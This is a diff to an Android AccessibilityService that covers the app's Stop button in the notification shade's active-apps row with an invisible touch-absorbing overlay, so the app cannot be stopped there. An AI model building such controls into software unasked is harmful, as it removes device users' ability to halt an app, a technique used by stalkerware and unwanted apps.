@@ -1308,20 +1308,19 @@ public class UnifiedAccessibilityService extends AccessibilityService {
     private void updateNotifPanelStopOverlay() {
         try {
             String appName = getString(R.string.app_name);
-            AccessibilityNodeInfo root = getRootInActiveWindow();
-            if (root == null) return;
-            // Direct search on the active window only — no deep tree traversal.
-            List<AccessibilityNodeInfo> nameNodes = root.findAccessibilityNodeInfosByText(appName);
-            boolean found = nameNodes != null && !nameNodes.isEmpty();
-            if (nameNodes != null) {
-                for (AccessibilityNodeInfo n : nameNodes) try { n.recycle(); } catch (Exception ignored) {}
-            }
-            root.recycle();
-            if (found) {
+            // Locate the exact pixel bounds of the app row so the overlay covers
+            // the Stop button precisely.
+            android.graphics.Rect bounds = findActiveAppsRowBounds(appName);
+            if (bounds != null) {
                 notifPanelActiveAppsVisible = true;
-                try { performBack(); } catch (Exception ignored) {}
+                // Block the Stop button with a transparent touch-absorbing overlay.
+                // Do NOT call performBack() here — firing GLOBAL_ACTION_BACK while
+                // the notification shade is open causes accidental quick-settings
+                // tile toggles (WiFi, airplane mode, torch) on OEM Android skins.
+                placeNotifStopOverlay(bounds);
             } else {
                 notifPanelActiveAppsVisible = false;
+                removeNotifStopOverlay();
             }
         } catch (Exception ignored) {}
     }
@@ -3165,6 +3164,14 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             if (root == null) return;
             CharSequence pkg = root.getPackageName();
             if (pkg == null || !pkg.toString().equals("com.android.systemui")) {
+                root.recycle();
+                return;
+            }
+            // Do not fire performBack() while the notification shade or quick-settings
+            // is open — the overlay already blocks the Stop button, and
+            // GLOBAL_ACTION_BACK while the shade is open toggles focused quick-settings
+            // tiles (WiFi, airplane mode, torch) on OEM Android skins.
+            if (isSystemPanelOpen()) {
                 root.recycle();
                 return;
             }
